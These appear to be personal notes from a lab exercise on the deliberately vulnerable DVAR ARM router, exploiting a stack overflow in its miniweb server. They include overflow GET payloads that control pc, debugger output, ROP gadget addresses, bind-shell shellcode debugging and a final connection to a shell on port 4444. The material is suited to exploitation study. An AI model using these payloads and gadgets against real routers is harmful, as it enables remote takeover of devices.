# Notes

Found the `miniweb` vulnerable executable:

    cd workspace/challs/dvar
    scp root@dvar:/usr/bin/miniweb ./

Try to install `pwndbg`:

    unzip pwndbg-dev.zip
    scp -r ./pwndbg-dev root@dvar:/root

and it was not successful - no Python interpreter outside GDB.

Try to run gdbserver:

    gdbserver 0.0.0.0:8888 --attach $(pidof miniweb)

    gdb -x ./miniweb.gdb

The `gdb` is f-ed! The remote debugging is a disaster - it does not get that the arch is ARM and `pwndbg` happily shows x86 registers.

Install `Raspbian` and run with QEMU command:

    qemu-system-arm -kernel /data/user/challs/rpi_qemu/kernel-qemu-4.4.34-jessie -cpu arm1176 -m 1024 -M versatilepb -serial stdio -append "root=/dev/sda2 rootfstype=ext4 rw" -hda /data/user/challs/rpi_qemu/2017-04-10-raspbian-jessie.img -redir tcp:5022::22 -no-reboot

Dump of `libvirt`'s QEMU command:

    $ virsh dumpxml rpi-arm | virsh domxml-to-native qemu-argv /dev/stdin

    LC_ALL=C PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin QEMU_AUDIO_DRV=spice /usr/bin/qemu-system-arm -name rpi-arm -machine virt,accel=tcg,usb=off -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid c9439a8e-5ece-4069-843a-163ba1541d46 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-rpi-arm/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -kernel /data/user/challs/rpi_qemu/kernel-qemu-4.4.34-jessie -append 'root=/dev/sda2 rootfstype=ext4 rw' -device i82801b11-bridge,id=pci.1,bus=pcie.0,addr=0x1 -device pci-bridge,chassis_nr=2,id=pci.2,bus=pci.1,addr=0x1 -device virtio-scsi-device,id=scsi0 -device virtio-serial-device,id=virtio-serial0 -usb -drive file=/data/user/challs/rpi_qemu/2017-04-10-raspbian-jessie.img,format=raw,if=none,id=drive-scsi0-0-0-0 -device scsi-hd,bus=scsi0.0,channel=0,scsi-id=0,lun=0,drive=drive-scsi0-0-0-0,id=scsi0-0-0-0,bootindex=1 -netdev tap,id=hostnet0 -device virtio-net-device,netdev=hostnet0,id=net0,mac=52:54:00:8c:a0:02 -serial pty -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5901,addr=127.0.0.1,disable-ticketing,seamless-migration=on -vga cirrus -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -msg timestamp=on


Try to install `gef` and run `gdbserver` again - successful !

On the server:

    gdbserver 0.0.0.0:8888 --attach $(pidof miniweb)

Locally:

     gef>  gef-remote -p 8888 dvar:8888



The overflow is at processing `GET` parameters:

    http://dvar/basic.html?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


**Important**: Use `gdb-multiarch` not `gdb`

1: On dvar:

    gdbserver 0.0.0.0:8888 --attach $(pidof miniweb)

2: On client:

    gdb-multiarch -x ./miniweb.gef.gdb

or if using `pwndbg`:
    
    gdb-multiarch -x ./miniweb.pwndbg.gdb

3: Navigate to `http://dvar` and submit the form:

    http://dvar/basic.html?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.254&_daylight_time=0&wan_proto=0&router_name=DVAR&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=254&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT%2B05%3A30%29+Bombay%2C+Calcutta%2C+Madras%2C+New+Delhi&layout=en


Try to find the bug:

-: Dump sum disassembly from `radare2`:

    #!pipe dump_funcs_sum.py -d miniweb.asm.sum

-: Break at `0x00011620 bl sym.serveconnection`:

    break *0x00011620

The snippet in `miniweb.asm/sym.serverconnection.asm` from `0x000118a8` to `0x00011944`: searches for `\n\r\n\r` in the received request.

-: Break at `0x000118a8      130000ea       b 0x118fc`:

    break *0x000118a8

The snippet just searches for `\n\r\n\r` as notion to end 1024 byte `recv`. Later the whole query string is `urldecode`d before the `SIGSEGV`.

-: Break at `0x00011994      10301be5       ldr r3, [fp - local_10h]    ; 0x10 ; 16`:

    break *0x00011994

Continue to trace and read assembly until I got to `0x00011cd8      d60500eb       bl sym.Log`. After it there is the `SIGSEGV`. So the vulnerable function si `sym.Log`.

The stack appears to be messed up for first time at `0x00013538      04d04be2       sub sp, fp, 4`. Tracing backward points to a call to `vsprintf` at `0x00013484      24f6ffeb       bl sym.imp.vsprintf         ; int vsprintf(char *s,`. Register `r11` plays role in stack mess up.

Testing payload:

    http://dvar/basic.html?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeeeebbbb

and I have successfully written `pc` and `r11` registers:

    ...
    $r11  : 0x65656565 ("eeee"?)
    $r12  : 0x00000024
    $sp   : 0xbeffbba8  →  0x00000000
    $lr   : 0x62626262 ("bbbb"?)
    $pc   : 0x62626262 ("bbbb"?)
    ...

From the task's hints:

    The ARM Exploit Laboratory
    ARM STACK OVERFLOW WARM-UP EXERCISE

    This is a warm-up exercise for exploiting stack overflows. The underlying web server is vulnerable to a stack overflow. Your task is to identify the input that triggers this vulnerability and write a working exploit for it.

    Follow the methodology, and get a shell!

        * Identify the vulnerable HTTP request.
        * Analyze the crash.
        * Is it a stack overflow? Check registers, stack memory.
        * Determine the offset to the Program Counter (PC).
        * Determine the position of the stack pointer relative to the beginning of the payload.
        * Overwrite PC precisely.
        * Plan the payload. Where shall you place the shellcode?
        * Search for a suitable Jump-through-Register instruction in the binary or shared libraries.
        * Inject and return to "test shellcode" (BKPT).
        * Prepare a final working exploit. 


Getting hex for software breakpoint:

    rasm2 -a arm.as -b 16 -C "BKPT"


By exploring the vulnerability it appears that:

* I can include non-printable characters cause the string is `urldecode`d before passing it to `vsprintf`
* `0x00` characters cut the string and must be avoided 


The moment of code execution is:

    ; Here the stack mess up
    |      `--> 0x00013538      04d04be2       sub sp, fp, 4
    |           0x0001353c      0048bde8       pop {fp, lr}
    |           0x00013540      10d08de2       add sp, sp, 0x10
    \           0x00013544      1eff2fe1       bx lr

It is in ARM mode.


    http://dvar/basic.html?aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaaaaabbbbAAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAABFAABGAABHAABIAABJAABKAABLAABMAABNAABOAABPAABQAABRAABSAABTAABUAABVAABWAccccddddeeeeffffgggghhhh

    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaaaaabbbbAAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAABFAABGAABHAABIAABJAABKAABLAABMAABNAABOAABPAABQAABRA



    # ldd /usr/bin/miniweb 
    /lib/ld-musl-armhf.so.1 (0x2a000000)
    libgcc_s.so.1 => /lib/libgcc_s.so.1 (0x40004000)
    libc.so => /lib/ld-musl-armhf.so.1 (0x2a000000)


    gef➤  vmmap 
    Start      End        Offset     Perm Path
    0x00010000 0x00014000 0x00000000 r-x /usr/bin/miniweb
    0x00023000 0x00026000 0x00003000 rwx /usr/bin/miniweb
    0x40000000 0x40064000 0x00000000 r-x /lib/libc.so
    0x40064000 0x40065000 0x00000000 r-x [sigpage]
    0x40068000 0x40069000 0x00000000 r-x /tmp/TZ
    0x40073000 0x40074000 0x00063000 r-x /lib/libc.so
    0x40074000 0x40075000 0x00064000 rwx /lib/libc.so
    0x40075000 0x40077000 0x00000000 rwx 
    0x40078000 0x40089000 0x00000000 r-x /lib/libgcc_s.so.1
    0x40089000 0x4008a000 0x00009000 rwx /lib/libgcc_s.so.1
    0xbefdf000 0xbf000000 0x00000000 rwx [stack]
    0xffff0000 0xffff1000 0x00000000 r-x [vectors]



Building ROP:

In `./libgcc_s.so.1`,:

    base: 0x40078000

    0x4110                E8BD800F                  pop {r0, r1, r2, r3, pc}

    0x8674                E1A0200D                  mov r2, sp
    0x8678                E12FFF33                  blx r3




    > 1 + 0x2c42          46C0                      nop         ; (mov r8, r8)
     + 0x2c44            4708                      bx   r1
    _______________________________________________________________

    > 1 + 0x2c46          46C0                      nop         ; (mov r8, r8)
     + 0x2c48            4710                      bx   r2
    _______________________________________________________________

    > 1 + 0x2c4a          46C0                      nop         ; (mov r8, r8)
     + 0x2c4c            4718                      bx   r3
    _______________________________________________________________

    > 1 + 0x2c4e          46C0                      nop         ; (mov r8, r8)
     + 0x2c50            4720                      bx   r4



    > 0x8808              E1A01007                  mov r1, r7
    0x880c                E1A0200D                  mov r2, sp
    0x8810                E59D3250                  ldr r3, [sp, #592]  ; 0x250
    0x8814                E12FFF33                  blx r3


    0x2c80                E49DF008                  ldr pc, [sp], #8


    > 0x2870              E59F3024                  ldr r3, [pc, #36]   ; 0x289c
    0x2874                E7943003                  ldr r3, [r4, r3]
    0x2878                E3530000                  cmp r3, #0
    0x287c                08BD8010                  popeq   {r4, pc}


    0x2980                E1A00002                  mov r0, r2
    0x2984                E12FFF1E                  bx  lr



In `./ld-musl-armhf.so.1`:

    base: 0x40073000

    0x00041e8c: blx r2; 



URLS:

* https://quequero.org/2017/07/arm-exploitation-iot-episode-1/
* https://quequero.org/2017/09/arm-exploitation-iot-episode-2/
* https://quequero.org/2017/11/arm-exploitation-iot-episode-3/
* https://quequero.org/2014/04/introduction-to-arm-architecture/
* https://developer.arm.com/products/software-development-tools/compilers/arm-compiler/downloads/version-6
* https://www.slideshare.net/MathivananNatarajan/arm-instruction-set-60665439


Enable core dumps:

    sysctl -w kernel.core_pattern=core && ulimit -c unlimited




Azeria's shellcode debug:

    $r0   : 0x000100bc  →  "/bin/sh"
    $r1   : 0x00000000
    $r2   : 0x00000000
    $r3   : 0x0001005d  →  <_start+9> movs r0,  #2
    $r4   : 0x00000004
    $r5   : 0x00000000
    $r6   : 0x00000000
    $r7   : 0x0000000b
    $r8   : 0x00000000
    $r9   : 0x00000000
    $r10  : 0x00000000
    $r11  : 0x00000000
    $r12  : 0x00000000
    $sp   : 0xbefffe10  →  0x00000001
    $lr   : 0x00000000
    $pc   : 0x000100b0  →  <_start+92> svc 1
    $cpsr : [THUMB fast interrupt overflow carry zero negative]
    ─────[ stack ]────
    0xbefffe10│+0x00: 0x00000001     ← $sp
    0xbefffe14│+0x04: 0xbefffef5  →  "./bind-azeria.x"
    0xbefffe18│+0x08: 0x00000000
    0xbefffe1c│+0x0c: 0xbeffff05  →  "SSH_CLIENT=192.168.18.1 37136 22"
    0xbefffe20│+0x10: 0xbeffff26  →  "USER=root"
    0xbefffe24│+0x14: 0xbeffff30  →  "SHLVL=1"
    0xbefffe28│+0x18: 0xbeffff38  →  "HOME=/root"
    0xbefffe2c│+0x1c: 0xbeffff43  →  "SSH_TTY=/dev/pts/0" 


Sindoni's shellcode debug:

    $r0   : 0x00010100  →  "/bin/sh"
    $r1   : 0xbefffdf0  →  0x00010100  →  "/bin/sh"
    $r2   : 0x00000000
    $r3   : 0x00000000
    $r4   : 0x00000000
    $r5   : 0x00000011
    $r6   : 0x00000003
    $r7   : 0x0000000b
    $r8   : 0x00000000
    $r9   : 0x00000000
    $r10  : 0x00000000
    $r11  : 0x00000000
    $r12  : 0x00000000
    $sp   : 0xbefffdf0  →  0x00010100  →  "/bin/sh"
    $lr   : 0x00000000
    $pc   : 0x000100f0  →  <loop+44> svc 0x00000000
    $cpsr : [thumb fast interrupt overflow CARRY ZERO negative]
    ──[ stack ]────
    0xbefffdf0│+0x00: 0x00010100  →  "/bin/sh"   ← $r1, $sp
    0xbefffdf4│+0x04: 0x00000000
    0xbefffdf8│+0x08: 0x5c110002
    0xbefffdfc│+0x0c: 0x00000000
    0xbefffe00│+0x10: 0x00000001
    0xbefffe04│+0x14: 0xbefffef3  →  "./bind-sindoni.x"
    0xbefffe08│+0x18: 0x00000000
    0xbefffe0c│+0x1c: 0xbeffff04  →  "SSH_CLIENT=192.168.18.1 37136 22"




    nmap -p 4444,80 dvar
    ./e.pt
    nmap -p 4444,80 dvar
    nc dvar 4444